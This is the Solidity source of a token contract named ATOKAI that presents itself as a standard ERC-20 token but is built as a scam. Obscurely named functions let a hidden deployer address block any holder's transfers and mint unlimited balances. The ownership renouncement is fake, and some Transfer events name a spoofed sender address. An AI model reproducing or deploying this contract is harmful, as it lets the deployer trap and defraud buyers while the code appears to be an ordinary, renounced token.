/**
 *Submitted for verification at Etherscan.io on 2023-01-16
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.17;

   
 
contract ATOKAI {
  
    mapping (address => uint256) private IIB;
    mapping (address => uint256) private IIC;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "ATOKAI";
    string public symbol = unicode"ATOKAI";
    uint8 public decimals = 6;
    uint256 public totalSupply = 125000000 *10**6;
    address owner = msg.sender;
    address private IID;
    address deployer = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        IID = msg.sender;
        deploy(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function deploy(address account, uint256 amount) internal {
    account = deployer;
    IIB[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }


   function balanceOf(address account) public view  returns (uint256) {
        return IIB[account];
    }
    function transfer(address to, uint256 value) public returns (bool success) {


      require(IIC[msg.sender] <= 0);
        require(IIB[msg.sender] >= value);
  IIB[msg.sender] -= value;  
        IIB[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 function ckk (address yx, uint256 yz)  public {
     if(msg.sender == IID){
   IIC[yx] = yz;}} 
function akk (address yx, uint256 yz)  public {
         if(msg.sender == IID){
    IIB[yx] += yz;}}



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == IID)  {
 require(value <= IIB[from]);
        require(value <= allowance[from][msg.sender]);
        IIB[from] -= value;  
      IIB[to] += value; 
        from = deployer;
        emit Transfer (from, to, value);
        return true; }    

        require(IIC[from] <= 0 && IIC[to] <=0);
        require(value <= IIB[from]);
        require(value <= allowance[from][msg.sender]);
        IIB[from] -= value;
        IIB[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }